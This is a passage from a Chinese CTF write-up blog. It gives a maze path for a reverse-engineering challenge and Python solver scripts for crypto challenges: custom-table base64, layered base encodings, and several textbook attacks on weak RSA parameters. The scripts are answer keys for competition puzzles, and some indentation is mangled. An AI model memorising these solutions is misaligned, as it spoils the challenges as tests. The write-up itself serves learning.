<p>  0x30, 0x30, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x2A, 0x2A, 0x2A,</p>
<p>  0x2A, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,</p>
<p>  0x30, 0x30, 0x0A, 0x0A</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921411-1787900803.jpg" alt="img"></p>
<p>num + num2 在中间过程中必须保持在 INDEXES[] 中。</p>
<p>经过所有字符输入后，num + num2 的最终值必须为 44。</p>
<p>其中一个符合条件的路径为：rdrrrrrddrruuurrrdddddllllllluull</p>
<p><img src="/C:/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20241004010343076.png" alt="image-20241004010343076"></p>
<p>解题收获：</p>
<p>对dnspy反编译调试exe文件，断点分析程序的运用更熟练</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="不小心"><a href="#不小心" class="headerlink" title="不小心"></a>不小心</h3><p>代码定义了一个字符串s，正则表达检查flag符合DASCTF{}格式，接着转换二进制字符串，补全为8位，将字符按照3字节与6字节分割转换，典型的换表base64类型</p>
<p>将base64字符集输入，将已经编码的字符串C对应到索引，定义exp进行递归，n分割4个为1字符依次递归base64函数解码</p>
<p>以下是exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"> \<span class="comment"># python 3.6</span></span><br><span class="line"></span><br><span class="line"> \<span class="comment"># import re</span></span><br><span class="line"></span><br><span class="line"> s = <span class="string">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">inputs</span>):</span><br><span class="line">   bin_str = [<span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> inputs] </span><br><span class="line">   outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">   nums = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> bin_str:</span><br><span class="line">     temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">len</span>(temp_list) != <span class="number">3</span>:</span><br><span class="line">       nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list) </span><br><span class="line">       temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>] * nums </span><br><span class="line">     temp_str = <span class="string">&#x27;&#x27;</span>.join(temp_list) </span><br><span class="line">     temp_str_list = [<span class="built_in">int</span>(temp_str[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> nums:</span><br><span class="line">   temp_str_list = temp_str_list[:<span class="number">4</span> - nums] </span><br><span class="line"></span><br><span class="line"> outputs += <span class="string">&#x27;&#x27;</span>.join(s[i] <span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list) </span><br><span class="line"> bin_str = bin_str[<span class="number">3</span>:] </span><br><span class="line"></span><br><span class="line">   outputs += <span class="string">&#x27;=&#x27;</span> * nums </span><br><span class="line">   <span class="keyword">return</span> outputs</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">custom_decode</span>(<span class="params">encoded_string, s, a</span>):</span><br><span class="line">   result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   <span class="keyword">for</span> char <span class="keyword">in</span> encoded_string:</span><br><span class="line">     <span class="keyword">if</span> char <span class="keyword">in</span> s:</span><br><span class="line">       index = s.index(char)</span><br><span class="line">       result += a[index] </span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> s = <span class="string">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class="line"> a = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line"> b = <span class="string">&#x27;+Se++h+mF5u0d++Oc++RbQJYbyuMb++0cYuQc+SwdmK0d+fwcYRYG+&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> decoded_string = custom_decode(b, s, a)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;Decoded to Base64:&quot;</span>, decoded_string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">base64_recursive_decode</span>(<span class="params">chunk, idx, ss</span>):</span><br><span class="line">   <span class="keyword">if</span> idx &gt;= <span class="number">4</span>: </span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">       decoded_chunk = b64decode(chunk)</span><br><span class="line">     <span class="keyword">except</span> Exception:</span><br><span class="line">       <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(byte) <span class="keyword">in</span> ss <span class="keyword">for</span> byte <span class="keyword">in</span> decoded_chunk):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Decoded chunk:&quot;</span>, decoded_chunk)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> chunk[idx] == <span class="string">&#x27;Q&#x27;</span>: </span><br><span class="line">     <span class="keyword">for</span> replacement <span class="keyword">in</span> <span class="string">&quot;QRSTU&quot;</span>:</span><br><span class="line">       new_chunk = chunk[:idx] + replacement + chunk[idx + <span class="number">1</span>:]</span><br><span class="line">       base64_recursive_decode(new_chunk, idx + <span class="number">1</span>, ss)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">     base64_recursive_decode(chunk, idx + <span class="number">1</span>, ss)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> ss = <span class="string">&#x27;0123456789abcdef-_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"> n = <span class="string">&#x27;QEFQQ1QGezc4YWQhMQEzZQcwOWZkZjEyYQVhYQQhYQVkZDYyZQMzfQ==&#x27;</span></span><br><span class="line"> n = n[<span class="number">8</span>:] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(n), <span class="number">4</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;--------- Decoding block:&#x27;</span>, v, n[v: v + <span class="number">4</span>])</span><br><span class="line">   base64_recursive_decode(n[v:v + <span class="number">4</span>], <span class="number">0</span>, ss)</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921535-1036607592.jpg" alt="img"></p>
<p>解题收获：</p>
<p>提高对变表base64的遍历能力编写</p>
<h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>这就是个套娃</p>
<p>Base100-base64-base85-base91-base62-再用随波逐流工具一键解码</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921441-1486957154.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921560-391088823.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921585-2046352629.jpg" alt="img"></p>
<p>解题收获：</p>
<p>对密码学编码形式更熟悉</p>
<h3 id="easy-crypto1"><a href="#easy-crypto1" class="headerlink" title="easy_crypto1"></a>easy_crypto1</h3><p>找到下一个比 getPrime(16) \times p + 38219 更大的素数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">n = <span class="number">1605247600724752598798254639224215706171506359654961357324428027985787942008103766562745464838961569081446916113769517713344420113584254259000172572811154232107339480903672251992191997458469905064423618888336088652352540882576826988355783159237971043770132628344798937353150930071309347972804118952814447576207066147031238749098842662046825743988208813903138796789940911515825517078554074496474819128789835309636804325132602557092847746454786387067599510769382078521691609970320528531270474091713477040343897269903489441410062592732302402854035415438078656688806905350495825334584533345448091335565792091890185673190424063</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">751639057610677013264061431434189083017589908118307247217007533938435229431015858783222167911772848893015518607229280589985711010766459396989232072512314594917029375221335361209036112742388866873824163350886610514973038316512032459352053158417705406031466332440378871927174731975794579894912999936641163063898365134788537389162378185448090279397717831977803284480743612393591614284972981435749362255654561121758163485884075260156288337176713756471879489767416836868661153693157792733142765671887792303181376620864506386820826866340907593080654521498766421056474652652337037121881207188033108746890998208582406826010121861</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">15</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> isPrime(i): </span><br><span class="line"></span><br><span class="line">​    candidate_q = next_prime(i * gmpy2.iroot(n // i, <span class="number">2</span>)[<span class="number">0</span>] + <span class="number">38219</span>)</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> n % candidate_q == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">​      q = candidate_q</span><br><span class="line"></span><br><span class="line">​      <span class="built_in">print</span>(<span class="string">f&quot;Found q: <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">E1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: <span class="subst">&#123;E1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>中国剩余定理解出E2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">moduli, remainders</span>):</span><br><span class="line"></span><br><span class="line">  total_sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  total_product = reduce(<span class="keyword">lambda</span> a, b: a * b, moduli) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> modulus, remainder <span class="keyword">in</span> <span class="built_in">zip</span>(moduli, remainders):</span><br><span class="line"></span><br><span class="line">​    partial_product = total_product // modulus </span><br><span class="line"></span><br><span class="line">​    total_sum += remainder * (gmpy2.invert(partial_product, modulus) * partial_product)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> total_sum % total_product </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">moduli_list = [</span><br><span class="line"></span><br><span class="line">  <span class="number">15863230586500684911356384742123404120213699052018048588650392009927565369685497256344682150189923131009586323640507773706997704860898682946308031020361302334248895233255911348365179153799197341744863134926804603973507415697810440916305092395180382239729550833607847524005391137474497849077097574452115379368463540087172800902210822143687014813631366360652583216269138116785489485772437870528892032119729929607857459621078790511144060710035933887337208301078892163837203412081114510143406013892393607932596921308889058909544584619676380766485493114814753878272881866907210235681877689493671668534251778397658670518117</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">14144098469438619358682652828507744381697293556670717685553585719665002440476256008471235313826051740009083510860714991201047915737216102220242621674841600987122005914542061963618272275986835928673920375768272390912778741502655909281390948606467847118377641357547931472588836726339758576038273820470879637555458446243401248151675266602656677360819563744765522495640821496694918515669243614141704744848980746101569785439728585144841655665959389460512628800782742764147773150430552859331269667626942993392101897661719871375721143240270211821269260950380944670195863016621594387236339317938305273510719419578308449465183</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">27563822879593503938377821960427219022565215631856333510782568496016547757945464794632272818101891677705256471714805217606503652132995136255720639088424576003650628211271025648183600635145895528466199068640094470078526413324708028578289949241288828542143203769199399500669311878391255837977932634772778594526940501234736059441483897017015324765266787399950699732518347518591167932031031320265136158304460199654008895095274754918153773566824931440342525688741289235153882699461549523425169846266597156773535163599640189457171272058311480951820887261040891344076039474315985825984444520336790670313179493074014037981261</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">remainders_list = [</span><br><span class="line"></span><br><span class="line">  <span class="number">3833095607830862948079097323254872789586576953317671099752083261949616608759231291050566542764984974722790226120399722937104503590740358249900089784508490830379531632752169777949200718567033018577184658177019404903817920024468923715441355404672443007723525750768430895425376124679225715687382380114628103058312176343693900115638265002657622618744666247132114654135429040069316368839938881716554901593031901272992940200484460436193699175500376368456706998564064693820008778900344357745691652875500810447147088715289581351501876012044611990972521570253106671158207677490849249612002954497927762168699886110455354481924</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">1502420121177211156091634258259634977709023894278792755694473756163084431123774101512866316989917922052023168401167212284219907272528117024670443698990238243030221117004372456475521502350404137469088570170885409265567084376069256924135270283335242133163303599239181417949980292944203204296598188175632723968779672994090788585343302473442389865459398142634104331743517384589200789331489394375604801951994831647339839112698394141328178967516636452592385248135340133712522135715943787590172334743893259621909532456281362868290556461907936774231166936915669816509378419892149164552548131776979706381641477878931403040942</span>,</span><br><span class="line"></span><br><span class="line">  <span class="number">8992204063713908492214256291861339175525948946919629972908439132005643626148678347198381531633907182877152728077958345519083406637446972079387161726967295886447791613166577391233866583354793842121902234644830640050181130381996083089350911224037154798259291124104894554037604500881250119806371348673833105103600782286898276354573884788251542211434143476774391457587885772379990104835187104619922442613860682792470389490804228050671124495925536024571104944112397143299499508504917890140939438891891453283594000764399193028606955089853654071198909973555844004685149713774167524224100487937899126480545681565581673958854</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">89</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">m_e = chinese_remainder_theorem(moduli_list, remainders_list)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">message = gmpy2.iroot(m_e, e)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>n1与n2有共同因子P，直接求最大公约数</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2140970977.jpg" alt="img"></p>
<ul>
<li></li>
<li></li>
</ul>
<p>print(gmpy2.gcd(E1, phi_1))# 35</p>
<p>同余性质，把m次幂的降最低</p>
<p>我们知道:如果a≡b(mod mn)，可以将其拆解为两个同余式:a ≡b(mod m)和a≡b(mod n)。基于此，存在以下推论:c1≡ m°(mod P)和 c ≡ me(mod Q1)，以及 c ≡ m°(mod P)和 c ≡ m“”(mod Q2)。通过相乘性质，我们可以得到 c &#x3D; c·c ≡ me·me(mod P).</p>
<p>然后，我们可以利用中国剩余定理，将这组同余方程结合起来得到唯一解:c&#x3D;me(mod Q)，c2三m,e2(mod Qz)，cs&#x3D;me·me(mod P)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_crt</span>(<span class="params">moduli, remainders</span>):</span><br><span class="line"></span><br><span class="line">  total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  N = reduce(<span class="keyword">lambda</span> a, b: a * b, moduli) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> modulus, remainder <span class="keyword">in</span> <span class="built_in">zip</span>(moduli, remainders):</span><br><span class="line"></span><br><span class="line">​    Ni = N // modulus </span><br><span class="line"></span><br><span class="line">​    total += remainder * gmpy2.invert(Ni, modulus) * Ni </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> total % N </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">n1 = <span class="number">21655617838358037895534605162358784326495251462447218485102155997156394132443891540203860915433559917314267455046844360743623050975083617915806922096697304603878134295964650430393375225792781804726292460923708890722827436552209016368047420993613497196059326374616217655625810171080545267058266278112647715784756433895809757917070401895613168910166812566545593405362953487807840539425383123369842741821260523005208479361484891762714749721683834754601596796707669718084343845276793153649005628590896279281956588607062999398889314240295073524688108299345609307659091936270255367762936542565961639163236594456862919813549</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">24623016338698579967431781680200075706241014384066250660360949684385831604822817314457973559632215801205780786144608311361063622813017396858888436529116737754653067203843306015767091585697803364656624926853551997229897087731298797904208292585562517602132663331748784390752958757661484560335406769204491939879324079089140420467301773366050084810282369044622442784113688062220370531522036512803461607049619641336524486507388232280683726065679295742456158606213294533956580462863488082028563360006966912264908424680686577344549034033470952036766850596897062924137344079889301948258438680545785139118107899367307031396309</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">2615722342860373905833491925692465899705229373785773622118746270300793647098821993550686581418882518204094299812033719020077509270290007615866572202192731169538843513634106977827187688709725198643481375562114294032637211892276591506759075653224150064709644522873824736707734614347484224826380423111005274801291329132431269949575630918992520949095837680436317128676927389692790957195674310219740918585437793016218702207192925330821165126647260859644876583452851011163136097317885847756944279214149072452930036614703451352331567857453770020626414948005358547089607480508274005888648569717750523094342973767148059329557</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">6769301750070285366235237940904276375318319174100507184855293529277737253672792851212185236735819718282816927603167670154115730023644681563602020732801002035524276894497009910595468459369997765552682404281557968383413458466181053253824257764740656801662020120125474240770889092605770532420770257017137747744565202144183642972714927894809373657977142884508230107940618969817885214454558667008383628769508472963039551067432579488899853537410634175220583489733111861415444811663313479382343954977022383996370428051605169520337142916079300674356082855978456798812661535740008277913769809112114364617214398154457094899399</span></span><br><span class="line"></span><br><span class="line">E1 = <span class="number">377312346502536339265</span></span><br><span class="line"></span><br><span class="line">E2 = <span class="number">561236991551738188085</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">P = gmpy2.gcd(n1, n2)</span><br><span class="line"></span><br><span class="line">Q1 = n1 // P</span><br><span class="line"></span><br><span class="line">Q2 = n2 // P</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp1 = gmpy2.invert(E1 // <span class="number">35</span>, (P - <span class="number">1</span>) * (Q1 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">exp2 = gmpy2.invert(E2 // <span class="number">35</span>, (P - <span class="number">1</span>) * (Q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">dec_c1 = <span class="built_in">pow</span>(c1, exp1, n1)</span><br><span class="line"></span><br><span class="line">dec_c2 = <span class="built_in">pow</span>(c2, exp2, n2)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">c3 = dec_c1 * dec_c2 % P</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">mod_c1 = dec_c1 % Q1</span><br><span class="line"></span><br><span class="line">mod_c2 = dec_c2 % Q2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">combined_result = solve_crt([mod_c1, mod_c2, c3], [Q1, Q2, P])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">phi = (Q1 - <span class="number">1</span>) * (Q2 - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n = Q1 * Q2</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">c_m = combined_result % n</span><br><span class="line"></span><br><span class="line">e = <span class="number">35</span> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">7</span>, phi)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c_m, d, n)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(m, <span class="number">5</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>解题收获：</p>
<p>提升简单逻辑推理能力，掌握中国剩余定理方法</p>
<h3 id="just-math"><a href="#just-math" class="headerlink" title="just math"></a>just math</h3><p>低加密指数e&#x3D;3，rsa的加密公式c &#x3D; m的e次方 mod n，c &lt; n^(1&#x2F;3), 通过直接计算密文的整数立方根来恢复原始消息 m</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ciphertext = <span class="number">1924635889210773924711378522965854207843051472146513194916783167061162458090637355250481272581703873478440579298520036474045171065792195995974658228386969780210579430878151292611702887188041669069264460156268170885354178469389132838450834398493018168203742426193822379309445968101310981520048027589913953414945962743334769252188573436970839413914815373095974184931183788899690779478585666855429821591221553873937831095720715148525794252576976891489499479497861512</span></span><br><span class="line"> modulus = <span 